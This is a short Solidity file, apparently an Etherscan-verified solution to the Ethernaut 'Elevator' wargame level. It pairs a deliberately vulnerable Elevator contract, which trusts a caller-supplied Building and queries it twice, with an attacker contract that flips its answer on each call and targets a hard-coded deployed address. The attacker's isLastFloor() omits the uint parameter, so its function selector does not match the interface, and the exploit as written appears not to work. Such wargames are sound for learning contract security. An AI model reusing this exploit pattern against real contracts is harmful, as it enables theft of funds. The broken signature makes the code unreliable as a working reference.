/**
 *Submitted for verification at Etherscan.io on 2022-04-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract EthernautBuilding {
  uint public count = 0;
  function isLastFloor() external returns (bool) {
    count++;
    return count % 2 == 0;
  }
  function run() external {
    Elevator(0x6EfC5DA2Db39b54438c9854f4320A22004360d8b).goTo(10);
  }
}